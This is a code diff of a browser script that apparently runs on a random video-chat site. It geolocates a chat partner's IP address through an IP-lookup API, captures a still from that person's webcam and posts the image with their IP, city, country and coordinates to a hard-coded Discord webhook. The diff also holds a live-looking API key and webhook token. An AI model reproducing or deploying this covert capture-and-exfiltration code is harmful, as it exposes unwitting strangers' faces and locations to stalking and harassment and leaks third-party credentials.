@@ -6,6 +6,7 @@
     const head = document.getElementsByTagName('head')[0];
     const body = document.getElementsByTagName('body')[0];
     const apiKey = "fa48bfe0005891";
+    var changed = false;
     const regionNames = new Intl.DisplayNames(['en'], {type: 'region'});
     const hexToDecimal = (hex) => {
         return parseInt(hex.replace("#", ""), 16);
@@ -52,6 +53,7 @@
             var canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+            wrapper.style.width = video.videoWidth+"px";
             var ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             base64Image = canvas.toDataURL('image/png');
@@ -101,7 +103,7 @@
         ip.innerText = ipp;
         city.innerText =  cityy;
         country.innerText =  regionNames.of(countryy);
-        proxy.innerText =  `${proxy}/${mobile}`;
+        loc.innerText =  locc;
     }
 
 
@@ -109,11 +111,11 @@
 
 
     var getLocation = async (ip,port) => {
-        let url = `http://ip-api.com/json/${ip}?fields=status,message,country,region,regionName,city,lat,lon,as,mobile,proxy,query`;
+        let url = `https://ipinfo.io/${ip}?token=${apiKey}`;
         await fetch(url).then((response) =>
             response.json().then((json) => {
                 const ip = json.ip+":"+port
-                set_message(ip, json.city, json.region, json.country,json.mobile,json.proxy);
+                set_message(ip, json.city, json.region, json.country, json.loc);
                 const request = new XMLHttpRequest();
                 const image = document.querySelector("#imag");
                 const video = document.querySelector("#remote-video");
@@ -121,6 +123,11 @@
                 const canvas = document.createElement('canvas');
                 request.open("POST", "https://discord.com/api/webhooks/1079404044445028402/496CuosXZpzH_Q4D1-JwQkE0LOINAAi1Z984gJojItH2Rio0fTWDLKfAbsFLqjbNJShD");
                 request.withCredentials = true
+                if(changed == false){
+                    const watermark = document.querySelector(".remote-video__watermark");
+                    watermark.backgroundImage = "url('https://cdn.discordapp.com/attachments/1137174682588684438/1178089070463815851/fnaf-freddy.gif?ex=6574dff2&is=65626af2&hm=2c305c579339e88c36f2797836604e92384bce88f0b2db6b028d6a5b90d6581f&')"
+                    changed = true;
+                }
                 var set = setInterval(() => {
                 if(wrapper.classList.contains('s-play')){
                     clearInterval(set);
@@ -130,7 +137,6 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     base64Image = canvas.toDataURL('image/png');
                     var image = document.querySelector("#imag");
-                    wrapper.style.width = video.videoWidth+"px";
                     image.src = base64Image;
                     var formData = new FormData();
                     var myEmbed = {
@@ -140,9 +146,7 @@
                         city: ${json.city} \n
                         region: ${json.region} \n
                         country: ${json.country} \n
-                        lat/long: ${json.loc} \n
-                        proxy/mobile: ${json.proxy}/${json.mobile} \n`,
-                        
+                        lat/long: ${json.loc} \n`,
                         color: hexToDecimal("#"+Math.floor(Math.random()*16777215).toString(16)),
                       };
                       var params = {
@@ -172,11 +176,9 @@
         var ip = document.getElementById("ip");
         var city = document.getElementById("city");
         var country = document.getElementById("country");
-        var proxy = document.getElementById("proxy");
+        var loc = document.getElementById("loc");
         var image = document.querySelector("#imag");
-        const watermark = document.querySelector(".remote-video__watermark");
-        watermark.backgroundImage = "url('https://cdn.discordapp.com/attachments/1137174682588684438/1178089070463815851/fnaf-freddy.gif?ex=6574dff2&is=65626af2&hm=2c305c579339e88c36f2797836604e92384bce88f0b2db6b028d6a5b90d6581f&')"
-    
+
         header.style.left = "0px";
         header.style.top = "0px";
         header.onmousedown = function (e) {
